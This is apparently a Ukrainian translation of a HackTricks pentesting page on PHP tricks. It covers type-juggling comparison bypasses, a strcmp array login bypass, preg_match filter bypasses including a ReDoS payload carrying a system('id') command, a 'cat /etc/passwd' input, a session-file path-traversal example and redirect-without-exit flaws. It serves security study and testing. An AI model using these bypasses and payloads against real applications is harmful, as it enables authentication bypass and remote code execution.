# PHP –ü—ñ–¥—Å—Ç—É–ø–∏

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF** –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>

## –ó–∞–≥–∞–ª—å–Ω–µ —Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è –∫—É–∫—ñ—Å—ñ–≤:

–¶–µ —Ç–∞–∫–æ–∂ —Å—Ç–æ—Å—É—î—Ç—å—Å—è –∫—É–∫—ñ—Å—ñ–≤ phpMyAdmin. 

–ö—É–∫—ñ—Å–∏:
```
PHPSESSID
phpMyAdmin
```
–ú—ñ—Å—Ü—è:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## –û–±—Ö—ñ–¥ –ø–æ—Ä—ñ–≤–Ω—è–Ω—å –≤ PHP

### –õ–µ–≥–∫—ñ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è/–¢–∏–ø–æ–≤–µ –¥–∂–µ—Ä–µ–ª–æ ( == )

–Ø–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è `==` –≤ PHP, —Ç–æ —ñ—Å–Ω—É—é—Ç—å –Ω–µ–æ—á—ñ–∫—É–≤–∞–Ω—ñ –≤–∏–ø–∞–¥–∫–∏, –∫–æ–ª–∏ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è –Ω–µ –ø—Ä–∞—Ü—é—î —è–∫ –æ—á—ñ–∫—É–≤–∞–ª–æ—Å—è. –¶–µ —Ç–æ–º—É, —â–æ "==" –ø–æ—Ä—ñ–≤–Ω—é—î –ª–∏—à–µ –∑–Ω–∞—á–µ–Ω–Ω—è, –ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω—ñ —É —Ç–æ–π —Å–∞–º–∏–π —Ç–∏–ø, —è–∫—â–æ –≤–∏ —Ç–∞–∫–æ–∂ —Ö–æ—á–µ—Ç–µ –ø–æ—Ä—ñ–≤–Ω—è—Ç–∏ —Ç–∏–ø –ø–æ—Ä—ñ–≤–Ω—é–≤–∞–Ω–∏—Ö –¥–∞–Ω–∏—Ö, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `===`.

–¢–∞–±–ª–∏—Ü—ñ –ø–æ—Ä—ñ–≤–Ω—è–Ω—å PHP: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` –†—è–¥–æ–∫, —è–∫–∏–π –Ω–µ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ —á–∏—Å–ª–∞, –¥–æ—Ä—ñ–≤–Ω—é—î —á–∏—Å–ª—É
* `"0xAAAA" == "43690" -> True` –†—è–¥–∫–∏, —Å–∫–ª–∞–¥–µ–Ω—ñ –∑ —á–∏—Å–µ–ª —É –¥–µ—Å—è—Ç–∫–æ–≤–æ–º—É –∞–±–æ —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–æ–º—É —Ñ–æ—Ä–º–∞—Ç—ñ, –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø–æ—Ä—ñ–≤–Ω—è–Ω—ñ –∑ —ñ–Ω—à–∏–º–∏ —á–∏—Å–ª–∞–º–∏/—Ä—è–¥–∫–∞–º–∏ –∑ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–º True, —è–∫—â–æ —á–∏—Å–ª–∞ –±—É–ª–∏ –æ–¥–Ω–∞–∫–æ–≤—ñ (—á–∏—Å–ª–∞ –≤ —Ä—è–¥–∫—É —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—é—Ç—å—Å—è —è–∫ —á–∏—Å–ª–∞)
* `"0e3264578" == 0 --> True` –†—è–¥–æ–∫, —â–æ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ "0e" —ñ –∑–∞ —è–∫–∏–º —Å–ª—ñ–¥—É—î –±—É–¥—å-—â–æ, –±—É–¥–µ –¥–æ—Ä—ñ–≤–Ω—é–≤–∞—Ç–∏ 0
* `"0X3264578" == 0X --> True` –†—è–¥–æ–∫, —â–æ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ "0" —ñ –∑–∞ —è–∫–∏–º —Å–ª—ñ–¥—É—î –±—É–¥—å-—è–∫–∞ –ª—ñ—Ç–µ—Ä–∞ (X –º–æ–∂–µ –±—É—Ç–∏ –±—É–¥—å-—è–∫–æ—é –ª—ñ—Ç–µ—Ä–æ—é) —ñ –∑–∞ —è–∫–∏–º —Å–ª—ñ–¥—É—î –±—É–¥—å-—â–æ, –±—É–¥–µ –¥–æ—Ä—ñ–≤–Ω—é–≤–∞—Ç–∏ 0
* `"0e12334" == "0" --> True` –¶–µ –¥—É–∂–µ —Ü—ñ–∫–∞–≤–æ, –æ—Å–∫—ñ–ª—å–∫–∏ —É –¥–µ—è–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö –≤–∏ –º–æ–∂–µ—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –≤–≤–µ–¥–µ–Ω–Ω—è —Ä—è–¥–∫–∞ "0" —Ç–∞ –¥–µ—è–∫–∏–π –≤–º—ñ—Å—Ç, —è–∫–∏–π —Ö–µ—à—É—î—Ç—å—Å—è —ñ –ø–æ—Ä—ñ–≤–Ω—é—î—Ç—å—Å—è –∑ –Ω–∏–º. –¢–æ–º—É, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è, —è–∫–µ —Å—Ç–≤–æ—Ä–∏—Ç—å —Ö–µ—à, —â–æ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ "0e" —ñ –±–µ–∑ –±—É–¥—å-—è–∫–æ—ó –ª—ñ—Ç–µ—Ä–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –æ–±—ñ–π—Ç–∏ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è. –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **–≤–∂–µ –∑–∞—Ö–µ—à–æ–≤–∞–Ω—ñ —Ä—è–¥–∫–∏** –∑ —Ü–∏–º —Ñ–æ—Ä–º–∞—Ç–æ–º —Ç—É—Ç: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` –ë—É–¥—å-—è–∫–∞ –ª—ñ—Ç–µ—Ä–∞ –≤ —Ä—è–¥–∫—É –¥–æ—Ä—ñ–≤–Ω—é—î —Ü—ñ–ª–æ–º—É —á–∏—Å–ª—É 0

–î–æ–¥–∞—Ç–∫–æ–≤–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**–¢–∏–ø–æ–≤–µ –¥–∂–µ—Ä–µ–ª–æ** —Ç–∞–∫–æ–∂ –≤–ø–ª–∏–≤–∞—î –Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—é `in_array()` –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º (–≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ true –¥–ª—è —Ç—Ä–µ—Ç—å–æ–≥–æ –∞—Ä–≥—É–º–µ–Ω—Ç—É, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ —Å—Ç—Ä–æ–≥–µ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

–Ø–∫—â–æ —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è **–±—É–¥—å-—è–∫–æ—ó –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è) —ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∫–æ–Ω—Ç—Ä–æ–ª—é—î –æ–¥–∏–Ω –±—ñ–∫ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è, –≤—ñ–Ω –º–æ–∂–µ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –ø–æ—Ä–æ–∂–Ω—ñ–π –º–∞—Å–∏–≤ –∑–∞–º—ñ—Å—Ç—å —Ä—è–¥–∫–∞ —è–∫ –∑–Ω–∞—á–µ–Ω–Ω—è –ø–∞—Ä–æ–ª—è (`https://example.com/login.php/?username=admin&password[]=`) —ñ –æ–±—ñ–π—Ç–∏ —Ü—é –ø–µ—Ä–µ–≤—ñ—Ä–∫—É:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
–¢–∞ –∂ –ø–æ–º–∏–ª–∫–∞ –≤–∏–Ω–∏–∫–∞—î –∑ `strcasecmp()`

### –°—É–≤–æ—Ä–µ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—è —Ç–∏–ø—ñ–≤

–ù–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è `===`, –º–æ–∂—É—Ç—å –≤–∏–Ω–∏–∫–∞—Ç–∏ –ø–æ–º–∏–ª–∫–∏, —è–∫—ñ —Ä–æ–±–ª—è—Ç—å –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–∏–º –¥–æ —Å—É–≤–æ—Ä–æ–≥–æ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—è —Ç–∏–ø—ñ–≤. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è –ø–µ—Ä–µ—Ç–≤–æ—Ä—é—î –¥–∞–Ω—ñ –≤ —ñ–Ω—à–∏–π —Ç–∏–ø –æ–±'—î–∫—Ç–∞ –ø–µ—Ä–µ–¥ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è–º:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –¥–ª—è **–ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –≤–≤–µ–¥–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** (–≤—ñ–Ω **–ø–µ—Ä–µ–≤—ñ—Ä—è—î**, —á–∏ —î **—Å–ª–æ–≤–æ/—Ä–µ–≥—É–ª—è—Ä–Ω–∏–π –≤–∏—Ä–∞–∑** –∑ **—á–æ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫—É** –ø—Ä–∏—Å—É—Ç–Ω—ñ–º —É **–≤–≤–µ–¥–µ–Ω–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**, —ñ —è–∫—â–æ –π–æ–≥–æ –Ω–µ–º–∞—î, –∫–æ–¥ –º–æ–∂–µ –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è).

#### –û–±—Ö—ñ–¥ –Ω–æ–≤–æ–≥–æ —Ä—è–¥–∫–∞

–û–¥–Ω–∞–∫, –∫–æ–ª–∏ –≤–∏–∑–Ω–∞—á–∞—î—Ç—å—Å—è –ø–æ—á–∞—Ç–æ–∫ —Ä–µ–≥—É–ª—è—Ä–Ω–æ–≥–æ –≤–∏—Ä–∞–∑—É, `preg_match()` **–ø–µ—Ä–µ–≤—ñ—Ä—è—î –ª–∏—à–µ –ø–µ—Ä—à–∏–π —Ä—è–¥–æ–∫ –≤–≤–µ–¥–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**, —Ç–æ–º—É —è–∫—â–æ –≤–∏ —è–∫–∏–º–æ—Å—å —á–∏–Ω–æ–º –º–æ–∂–µ—Ç–µ **–Ω–∞–¥—ñ—Å–ª–∞—Ç–∏** –≤–≤–µ–¥–µ–Ω–Ω—è —É **–∫—ñ–ª—å–∫–æ—Ö —Ä—è–¥–∫–∞—Ö**, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –æ–±—ñ–π—Ç–∏ —Ü—é –ø–µ—Ä–µ–≤—ñ—Ä–∫—É. –ü—Ä–∏–∫–ª–∞–¥:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
–î–ª—è –æ–±—Ö–æ–¥—É —Ü—ñ—î—ó –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ **–Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –∑ –Ω–æ–≤–∏–º–∏ —Ä—è–¥–∫–∞–º–∏, –∑–∞–∫–æ–¥–æ–≤–∞–Ω–∏–º–∏ —É URL** (`%0A`) –∞–±–æ, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ **JSON –¥–∞–Ω—ñ**, –Ω–∞–¥—ñ—à–ª—ñ—Ç—å —ó—Ö —É **–¥–µ–∫—ñ–ª—å–∫–æ—Ö —Ä—è–¥–∫–∞—Ö**:
```php
{
"cmd": "cat /etc/passwd"
}
```
–ó–Ω–∞–π–¥—ñ—Ç—å –ø—Ä–∏–∫–ª–∞–¥ —Ç—É—Ç: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **–û–±—Ö—ñ–¥ –ø–æ–º–∏–ª–∫–∏ –¥–æ–≤–∂–∏–Ω–∏**

(–¶–µ–π –æ–±—Ö—ñ–¥, —Å—Ö–æ–∂–µ, –±—É–≤ —Å–ø—Ä–æ–±–æ–≤–∞–Ω–∏–π –Ω–∞ PHP 5.2.5, —ñ —è –Ω–µ –∑–º—ñ–≥ –∑—Ä–æ–±–∏—Ç–∏ –π–æ–≥–æ –ø—Ä–∞—Ü—é—é—á–∏–º –Ω–∞ PHP 7.3.15)\
–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–¥–∞—Ç–∏ `preg_match()` –¥—ñ–π—Å–Ω–∏–π **–≤–µ–ª–∏–∫–∏–π –≤–≤—ñ–¥**, –≤—ñ–Ω **–Ω–µ –∑–º–æ–∂–µ –æ–±—Ä–æ–±–∏—Ç–∏ –π–æ–≥–æ**, —ñ –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–æ–±—ñ–π—Ç–∏** –ø–µ—Ä–µ–≤—ñ—Ä–∫—É. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –≤—ñ–Ω –±–ª–æ–∫—É—î JSON, –≤–∏ –º–æ–∂–µ—Ç–µ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### –ü—Ä–æ—Ö—ñ–¥ ReDoS

–•–∏—Ç—Ä—ñ—Å—Ç—å –∑: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

–ö–æ—Ä–æ—Ç–∫–æ –∫–∞–∂—É—á–∏, –ø—Ä–æ–±–ª–µ–º–∞ –≤–∏–Ω–∏–∫–∞—î —á–µ—Ä–µ–∑ —Ç–µ, —â–æ —Ñ—É–Ω–∫—Ü—ñ—ó `preg_*` –≤ PHP –±–∞–∑—É—é—Ç—å—Å—è –Ω–∞ [–±—ñ–±–ª—ñ–æ—Ç–µ—Ü—ñ PCRE](http://www.pcre.org/). –£ PCRE –¥–µ—è–∫—ñ —Ä–µ–≥—É–ª—è—Ä–Ω—ñ –≤–∏—Ä–∞–∑–∏ –∑–±—ñ–≥–∞—é—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –±–∞–≥–∞—Ç—å–æ—Ö —Ä–µ–∫—É—Ä—Å–∏–≤–Ω–∏—Ö –≤–∏–∫–ª–∏–∫—ñ–≤, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –±–∞–≥–∞—Ç–æ —Å—Ç–µ–∫–æ–≤–æ–≥–æ –ø—Ä–æ—Å—Ç–æ—Ä—É. –ú–æ–∂–ª–∏–≤–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –æ–±–º–µ–∂–µ–Ω–Ω—è –Ω–∞ –∫—ñ–ª—å–∫—ñ—Å—Ç—å –¥–æ–∑–≤–æ–ª–µ–Ω–∏—Ö —Ä–µ–∫—É—Ä—Å—ñ–π, –∞–ª–µ –≤ PHP —Ü–µ –æ–±–º–µ–∂–µ–Ω–Ω—è [–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Å—Ç–∞–Ω–æ–≤–∏—Ç—å 100 000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), —â–æ –±—ñ–ª—å—à–µ, –Ω—ñ–∂ –≤–º—ñ—â—É—î—Ç—å—Å—è –≤ —Å—Ç–µ–∫—É.

[–£ —Ü—å–æ–º—É –æ–±–≥–æ–≤–æ—Ä–µ–Ω–Ω—ñ –Ω–∞ Stackoverflow](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) —Ç–∞–∫–æ–∂ –±—É–ª–æ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ —Ç–µ, –¥–µ –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω–æ –≥–æ–≤–æ—Ä–∏—Ç—å—Å—è –ø—Ä–æ —Ü—é –ø—Ä–æ–±–ª–µ–º—É. –ù–∞—à–µ –∑–∞–≤–¥–∞–Ω–Ω—è –±—É–ª–æ —Ç–µ–ø–µ—Ä –∑—Ä–æ–∑—É–º—ñ–ª–∏–º:\
**–ù–∞–¥—ñ—Å–ª–∞—Ç–∏ –≤—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ, —è–∫—ñ –∑–º—É—Å–∏–ª–∏ –± —Ä–µ–≥—É–ª—è—Ä–Ω–∏–π –≤–∏—Ä–∞–∑ –≤–∏–∫–æ–Ω–∞—Ç–∏ 100 000+ —Ä–µ–∫—É—Ä—Å—ñ–π, —Å–ø—Ä–∏—á–∏–Ω—è—é—á–∏ SIGSEGV, —â–æ –∑–º—É—Å–∏—Ç—å —Ñ—É–Ω–∫—Ü—ñ—é `preg_match()` –ø–æ–≤–µ—Ä–Ω—É—Ç–∏ `false`, —Ç–∏–º —Å–∞–º–∏–º –∑–º—É—à—É—é—á–∏ –¥–æ–¥–∞—Ç–æ–∫ –≤–≤–∞–∂–∞—Ç–∏, —â–æ –Ω–∞—à –≤–≤—ñ–¥ –Ω–µ —î –∑–ª–æ–≤–º–∏—Å–Ω–∏–º, –∫–∏–Ω—É–≤—à–∏ —Å—é—Ä–ø—Ä–∏–∑ –≤ –∫—ñ–Ω—Ü—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —â–æ—Å—å –Ω–∞ –∑—Ä–∞–∑–æ–∫ `{system(<–¥—É–∂–µ–ø–æ–≥–∞–Ω–∞–∫–æ–º–∞–Ω–¥–∞>)}` –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è SSTI --> RCE --> –ø—Ä–∞–ø–æ—Ä—Ü—è :)**.

–ù—É, –≤ —Ç–µ—Ä–º—ñ–Ω–∞—Ö —Ä–µ–≥—É–ª—è—Ä–Ω–∏—Ö –≤–∏—Ä–∞–∑—ñ–≤, –º–∏ —Ñ–∞–∫—Ç–∏—á–Ω–æ –Ω–µ —Ä–æ–±–∏–º–æ 100 —Ç–∏—Å. "—Ä–µ–∫—É—Ä—Å—ñ–π", –∞ –∑–∞–º—ñ—Å—Ç—å —Ü—å–æ–≥–æ –º–∏ —Ä–∞—Ö—É—î–º–æ "–∫—Ä–æ–∫–∏ –≤—ñ–¥—Å—Ç–µ–∂–µ–Ω–Ω—è –Ω–∞–∑–∞–¥", —è–∫ —Ü–µ —Å—Ç–≤–µ—Ä–¥–∂—É—î [–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—è PHP](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Ü–µ —Å—Ç–∞–Ω–æ–≤–∏—Ç—å 1 000 000 (1–ú) —É –∑–º—ñ–Ω–Ω—ñ–π `pcre.backtrack_limit`.\
–©–æ–± –¥–æ—Å—è–≥—Ç–∏ —Ü—å–æ–≥–æ, `'X'*500_001` –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ 1 –º—ñ–ª—å–π–æ–Ω–∞ –∫—Ä–æ–∫—ñ–≤ –≤—ñ–¥—Å—Ç–µ–∂–µ–Ω–Ω—è –Ω–∞–∑–∞–¥ (500 —Ç–∏—Å. –≤–ø–µ—Ä–µ–¥ —ñ 500 —Ç–∏—Å. –Ω–∞–∑–∞–¥):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### –¢–∏–ø–æ–≤–µ –∑–∞–º—ñ–Ω–∏ –¥–ª—è –∑–∞—Ö–∏—Å—Ç—É PHP –∫–æ–¥—É
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## –í–∏–∫–æ–Ω–∞–Ω–Ω—è –ø—ñ—Å–ª—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è (EAR)

–Ø–∫—â–æ PHP –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—î –Ω–∞ —ñ–Ω—à—É —Å—Ç–æ—Ä—ñ–Ω–∫—É, –∞–ª–µ –ø—ñ—Å–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∑–∞–≥–æ–ª–æ–≤–∫–∞ `Location` –Ω–µ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è —Ñ—É–Ω–∫—Ü—ñ—è **`die`** –∞–±–æ **`exit`**, PHP –ø—Ä–æ–¥–æ–≤–∂—É—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ç–∞ –¥–æ–¥–∞—î –¥–∞–Ω—ñ –¥–æ —Ç—ñ–ª–∞ —Å—Ç–æ—Ä—ñ–Ω–∫–∏:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è —Ç—Ä–∞–≤–µ—Ä—Å—É —à–ª—è—Ö—É —Ç–∞ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ:

{% content-ref url="../../../pentesting-web/file-inclusion/" %}
[file-inclusion](../../../pentesting-web/file-inclusion/)
{% endcontent-ref %}

## –î–æ–¥–∞—Ç–∫–æ–≤—ñ —Ö–∏—Ç—Ä–æ—â—ñ

* **register\_globals**: –£ **PHP < 4.1.1.1** –∞–±–æ —è–∫—â–æ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ —Å–∫–æ–Ω—Ñ—ñ–≥—É—Ä–æ–≤–∞–Ω–æ, **register\_globals** –º–æ–∂–µ –±—É—Ç–∏ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–∏–π (–∞–±–æ —ó—Ö –ø–æ–≤–µ–¥—ñ–Ω–∫–∞ —ñ–º—ñ—Ç—É—î—Ç—å—Å—è). –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤ –≥–ª–æ–±–∞–ª—å–Ω–∏—Ö –∑–º—ñ–Ω–Ω–∏—Ö, —Ç–∞–∫–∏—Ö —è–∫ $\_GET, —è–∫—â–æ –≤–æ–Ω–∏ –º–∞—é—Ç—å –∑–Ω–∞—á–µ–Ω–Ω—è, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ $\_GET\["param"]="1234", –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –Ω—å–æ–≥–æ —á–µ—Ä–µ–∑ **$param. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ HTTP-–ø–∞—Ä–∞–º–µ—Ç—Ä–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –∑–º—ñ–Ω–Ω—ñ**, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –≤ –∫–æ–¥—ñ.
